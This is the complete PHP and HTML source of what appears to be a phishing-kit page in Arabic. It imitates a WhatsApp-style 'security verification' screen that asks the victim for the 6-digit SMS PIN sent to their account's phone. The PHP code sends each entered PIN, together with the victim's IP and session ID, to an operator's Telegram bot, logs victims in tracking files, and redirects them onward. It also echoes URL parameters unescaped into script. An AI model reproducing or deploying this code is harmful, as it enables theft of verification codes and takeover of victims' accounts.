<?php
// الحصول على معاملات من عنوان URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';
$pinCode = ''; // تهيئة المتغير لتجنب الخطأ

// التحقق من وجود المعاملات
if (empty($sessionId) || empty($clientIp)) {
    die("معاملات مفقودة");
}

// التحقق من وجود إجراء جاري
$actionFile = 'sessions/' . $sessionId . '_action.json';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['action']) && $actionData['action'] === 'pin_error') {
        $errorMessage = $actionData['errorMessage'] ?? 'رمز PIN الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.';
        // حذف الإجراء لعدم عرض الخطأ في حلقة
        unlink($actionFile);
    }
}

// تحديث ملف التتبع
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'sms_verification.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// إنشاء مجلد التتبع إن لم يكن موجوداً
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// ========== منطق التحقق من PIN ==========
// التحقق من تقديم رمز PIN
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pin_code'])) {
    $submittedPin = $_POST['pin_code'] ?? '';
    
    // إنشاء مجلد الجلسات إن لم يكن موجوداً
    if (!file_exists('sessions')) {
        mkdir('sessions', 0777, true);
    }
    
    // الحصول على PIN المتوقع من ملف الجلسة
    $sessionFile = 'sessions/' . $sessionId . '.json';
    $expectedPin = '306523'; // رمز PIN الافتراضي للاختبار
    
    if (file_exists($sessionFile)) {
        $sessionData = json_decode(file_get_contents($sessionFile), true);
        $expectedPin = $sessionData['pin'] ?? '306523';
    }
    
    // التحقق من صحة PIN
    if (!empty($submittedPin) && !empty($expectedPin) && $submittedPin === $expectedPin) {
        // PIN صحيح - إعادة توجيه إلى الصفحة التالية
        $actionData = [
            'action' => 'pin_correct',
            'timestamp' => time()
        ];
        file_put_contents('sessions/' . $sessionId . '_action.json', json_encode($actionData));
        
        // إرسال إشعار Telegram
        $telegramMessage = "✅ رمز PIN صحيح\n\n🔑 معرف الجلسة: " . $sessionId . "\n🌐 عنوان IP: " . $clientIp . "\n📱 الرمز: " . $submittedPin;
        sendTelegramNotification($telegramMessage);
        
        // إعادة توجيه إلى صفحة النجاح
        header('Location: success.php?session=' . urlencode($sessionId) . '&ip=' . urlencode($clientIp));
        exit();
    } else {
        // PIN غير صحيح - عرض الخطأ
        $errorMessage = 'رمز PIN الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.';
        
        // حفظ الخطأ
        $actionData = [
            'action' => 'pin_error',
            'errorMessage' => $errorMessage,
            'timestamp' => time()
        ];
        file_put_contents('sessions/' . $sessionId . '_action.json', json_encode($actionData));
        
        // إرسال إشعار Telegram لمحاولة فاشلة
        $telegramMessage = "❌ رمز PIN غير صحيح\n\n🔑 معرف الجلسة: " . $sessionId . "\n🌐 عنوان IP: " . $clientIp . "\n📱 الرمز المستقبل: " . $submittedPin . "\n📱 الرمز المتوقع: " . $expectedPin;
        sendTelegramNotification($telegramMessage);
    }
}

// دالة إرسال إشعارات Telegram
function sendTelegramNotification($message) {
    // تحميل تكوين Telegram من ملف telegram_config.json
    $configFile = 'telegram_config.json';
    
    if (!file_exists($configFile)) {
        return false; // ملف التكوين مفقود
    }
    
    $config = json_decode(file_get_contents($configFile), true);
    
    if (!isset($config['bot_token']) || !isset($config['chat_id'])) {
        return false; // التكوين غير كامل
    }
    
    $botToken = $config['bot_token'];
    $chatId = $config['chat_id'];
    
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result !== false;
}

// متغير لرمز PIN المتوقع
$expectedPinCode = '';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من رمز PIN</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            color: #111;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            max-width: 420px;
            width: 100%;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo-circle {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
        }
        
        .logo-circle i {
            color: white;
            font-size: 36px;
        }
        
        .header-title {
            font-size: 24px;
            font-weight: 700;
            color: #25D366;
            margin-bottom: 8px;
        }
        
        .header-subtitle {
            font-size: 14px;
            color: #54656f;
        }
        
        .verification-card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            padding: 30px 25px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .verification-card::before {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #25D366, #1ebc5e, #25D366);
        }
        
        .card-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #25D366;
            text-align: center;
        }
        
        .card-message {
            color: #54656f;
            margin-bottom: 25px;
            text-align: center;
            font-size: 14px;
            line-height: 1.6;
        }
        
        .phone-number {
            text-align: center;
            margin-bottom: 20px;
            padding: 12px;
            background: linear-gradient(135deg, #e8f5e9 0%, #f1f8f6 100%);
            border-radius: 8px;
            border-right: 4px solid #25D366;
        }
        
        .phone-number-label {
            font-size: 12px;
            color: #54656f;
            margin-bottom: 4px;
        }
        
        .phone-number-value {
            font-size: 16px;
            font-weight: 600;
            color: #25D366;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #111;
            margin-bottom: 8px;
        }
        
        .pin-input-group {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 15px;
            flex-direction: row-reverse;
        }
        
        .pin-input {
            width: 50px;
            height: 50px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            color: #25D366;
            background-color: #f8f8f8;
            transition: all 0.3s ease;
        }
        
        .pin-input:focus {
            border-color: #25D366;
            outline: none;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.1);
        }
        
        .pin-input::placeholder {
            color: #ccc;
        }
        
        .input-alternative {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            color: #111;
            text-align: center;
            letter-spacing: 3px;
            font-weight: bold;
            transition: all 0.3s ease;
            display: none;
        }
        
        .input-alternative:focus {
            border-color: #25D366;
            outline: none;
            background-color: #f8f8f8;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: flex;
            align-items: flex-start;
            border-right: 4px solid #c62828;
        }
        
        .error-message i {
            margin-left: 10px;
            margin-top: 2px;
            font-size: 16px;
            flex-shrink: 0;
        }
        
        .error-message span {
            flex: 1;
        }
        
        .success-message {
            background-color: #e8f5e9;
            color: #2e7d32;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: flex;
            align-items: flex-start;
            border-right: 4px solid #2e7d32;
            display: none;
        }
        
        .success-message i {
            margin-left: 10px;
            margin-top: 2px;
            font-size: 16px;
            flex-shrink: 0;
        }
        
        .verify-button {
            width: 100%;
            padding: 14px 0;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
            margin-bottom: 12px;
        }
        
        .verify-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.4);
        }
        
        .verify-button:active {
            transform: translateY(0);
        }
        
        .verify-button i {
            margin-left: 8px;
        }
        
        .timer {
            text-align: center;
            margin-bottom: 15px;
            color: #54656f;
            font-size: 14px;
        }
        
        .timer-value {
            font-weight: 700;
            color: #25D366;
            font-size: 16px;
        }
        
        .resend-section {
            text-align: center;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #ddd;
        }
        
        .resend-text {
            font-size: 14px;
            color: #54656f;
            margin-bottom: 8px;
        }
        
        .resend-link {
            color: #25D366;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: none;
        }
        
        .resend-link:hover {
            text-decoration: underline;
        }
        
        .resend-link.disabled {
            color: #bbb;
            cursor: not-allowed;
            text-decoration: none;
        }
        
        .toggle-input {
            text-align: center;
            margin-top: 12px;
        }
        
        .toggle-input a {
            font-size: 12px;
            color: #54656f;
            text-decoration: none;
            cursor: pointer;
        }
        
        .toggle-input a:hover {
            color: #25D366;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #54656f;
            font-size: 12px;
        }
        
        .footer p {
            margin-bottom: 8px;
        }
        
        .footer a {
            color: #25D366;
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .security-note {
            background: linear-gradient(135deg, #e8f5e9 0%, #f1f8f6 100%);
            border-right: 4px solid #25D366;
            padding: 12px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 12px;
            color: #2e7d32;
        }
        
        .security-note i {
            margin-left: 6px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
            
            .verification-card {
                padding: 20px 16px;
            }
            
            .header-title {
                font-size: 20px;
            }
            
            .pin-input {
                width: 45px;
                height: 45px;
                font-size: 20px;
            }
            
            .pin-input-group {
                gap: 6px;
            }
        }
        
        @media (max-width: 320px) {
            .pin-input {
                width: 40px;
                height: 40px;
                font-size: 18px;
            }
            
            .pin-input-group {
                gap: 4px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-circle">
                <i class="fas fa-lock"></i>
            </div>
            <div class="header-title">التحقق من الأمان</div>
            <div class="header-subtitle">تأكيد هويتك</div>
        </div>
        
        <div class="verification-card">
            <div class="card-title">أدخل رمز PIN الخاص بك</div>
            <p class="card-message">
                لأسباب أمنية، يرجى إدخال رمز PIN المكون من 6 أرقام المرسل عبر SMS إلى رقم الهاتف المرتبط بحسابك.
            </p>
            
            <div class="phone-number">
                <div class="phone-number-label">رقم الهاتف المرتبط</div>
                <div class="phone-number-value">
                    <i class="fas fa-lock" style="margin-left: 6px;"></i>
                    ••••••••••••
                </div>
            </div>
            
            <?php if (!empty($errorMessage)): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i>
                <span><?php echo htmlspecialchars($errorMessage); ?></span>
            </div>
            <?php endif; ?>
            
            <div class="success-message" id="success-message">
                <i class="fas fa-check-circle"></i>
                <span>تم استقبال الرمز! جاري التحويل...</span>
            </div>

            <form id="sms-form" method="POST" action="">
                <div class="form-group">
                    <label for="pin-code" class="form-label">رمز PIN (6 أرقام)</label>
                    
                    <div class="pin-input-group" id="pin-input-group">
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    </div>
                    
                    <input type="hidden" id="pin-code" name="pin_code" value="">
                    
                    <input type="text" id="pin-input-alternative" class="input-alternative" name="pin_code_alt" placeholder="000000" maxlength="6" pattern="[0-9]*" inputmode="numeric">
                </div>
                
                <div class="timer">
                    الوقت المتبقي لإدخال الرمز: <span class="timer-value" id="countdown">02:00</span>
                </div>
                
                <button type="submit" class="verify-button">
                    <i class="fas fa-check"></i> تحقق
                </button>
                
                <div class="toggle-input">
                    <a href="#" id="toggle-input-method">أدخل الرمز بطريقة مختلفة</a>
                </div>
                
            </form>
            
            <div class="security-note">
                <i class="fas fa-shield-alt"></i>
                لا تشارك أبداً رمز PIN الخاص بك مع أحد. لن نطلبه منك أبداً.
            </div>
        </div>
        
        <div class="footer">
            <p>© 2026 التحقق من الأمان</p>
            <p><a href="#">شروط الاستخدام</a> · <a href="#">سياسة الخصوصية</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            const expectedPinCode = '<?php echo $expectedPinCode; ?>';
            const smsForm = document.getElementById('sms-form');
            const pinInputs = document.querySelectorAll('.pin-input');
            const pinInputAlternative = document.getElementById('pin-input-alternative');
            const pinCodeInput = document.getElementById('pin-code');
            const resendLink = document.querySelector('.resend-link');
            const countdownElement = document.getElementById('countdown');
            const toggleInputMethod = document.getElementById('toggle-input-method');
            const pinInputGroup = document.getElementById('pin-input-group');
            const successMessage = document.getElementById('success-message');
            
            let currentInputMode = 'boxes';
            
            pinInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = this.value;
                    
                    if (!/[0-9]/.test(value)) {
                        this.value = '';
                        return;
                    }
                    
                    if (value && index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    }
                    
                    updatePinValue();
                    
                    if (allInputsFilled()) {
                        setTimeout(() => {
                            smsForm.dispatchEvent(new Event('submit'));
                        }, 300);
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !this.value && index > 0) {
                        pinInputs[index - 1].focus();
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pastedData = (e.clipboardData || window.clipboardData).getData('text');
                    const digits = pastedData.replace(/[^0-9]/g, '').slice(0, 6);
                    
                    digits.split('').forEach((digit, i) => {
                        if (i < pinInputs.length) {
                            pinInputs[i].value = digit;
                        }
                    });
                    
                    updatePinValue();
                    
                    if (allInputsFilled()) {
                        setTimeout(() => {
                            smsForm.dispatchEvent(new Event('submit'));
                        }, 300);
                    }
                });
            });
            
            pinInputAlternative.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
                pinCodeInput.value = this.value;
            });
            
            toggleInputMethod.addEventListener('click', function(e) {
                e.preventDefault();
                
                if (currentInputMode === 'boxes') {
                    pinInputGroup.style.display = 'none';
                    pinInputAlternative.style.display = 'block';
                    pinInputAlternative.focus();
                    currentInputMode = 'text';
                    toggleInputMethod.textContent = 'استخدم الصناديق';
                } else {
                    pinInputGroup.style.display = 'flex';
                    pinInputAlternative.style.display = 'none';
                    pinInputs[0].focus();
                    currentInputMode = 'boxes';
                    toggleInputMethod.textContent = 'أدخل الرمز بطريقة مختلفة';
                }
            });
            
            function updatePinValue() {
                const pinValue = Array.from(pinInputs).map(input => input.value).join('');
                pinCodeInput.value = pinValue;
            }
            
            function allInputsFilled() {
                return Array.from(pinInputs).every(input => input.value !== '');
            }
            
            pinInputs[0].focus();
            
            smsForm.addEventListener('submit', function(event) {
                event.preventDefault();
                
                let pinCode = '';
                if (currentInputMode === 'boxes') {
                    pinCode = Array.from(pinInputs).map(input => input.value).join('');
                } else {
                    pinCode = pinInputAlternative.value.trim();
                }
                
                if (pinCode.length !== 6 || !/^[0-9]{6}$/.test(pinCode)) {
                    alert('يرجى إدخال رمز PIN صحيح يتكون من 6 أرقام');
                    return;
                }
                
                successMessage.style.display = 'flex';
                
                if (currentInputMode === 'boxes') {
                    pinInputs.forEach(input => input.disabled = true);
                } else {
                    pinInputAlternative.disabled = true;
                }
                
                smsForm.submit();
            });
            
            let timeLeft = 120;
            let countdownInterval;
            
            function updateCountdown() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    resendLink.style.display = 'inline';
                } else {
                    timeLeft--;
                }
            }
            
            updateCountdown();
            countdownInterval = setInterval(updateCountdown, 1000);
            
            if (resendLink) {
                resendLink.addEventListener('click', function(event) {
                    event.preventDefault();
                    
                    timeLeft = 120;
                    updateCountdown();
                    resendLink.style.display = 'none';
                    
                    clearInterval(countdownInterval);
                    countdownInterval = setInterval(updateCountdown, 1000);
                    
                    pinInputs.forEach(input => input.value = '');
                    pinInputAlternative.value = '';
                    pinCodeInput.value = '';
                    pinInputs[0].focus();
                });
            }
        });
    </script>
</body>
</html>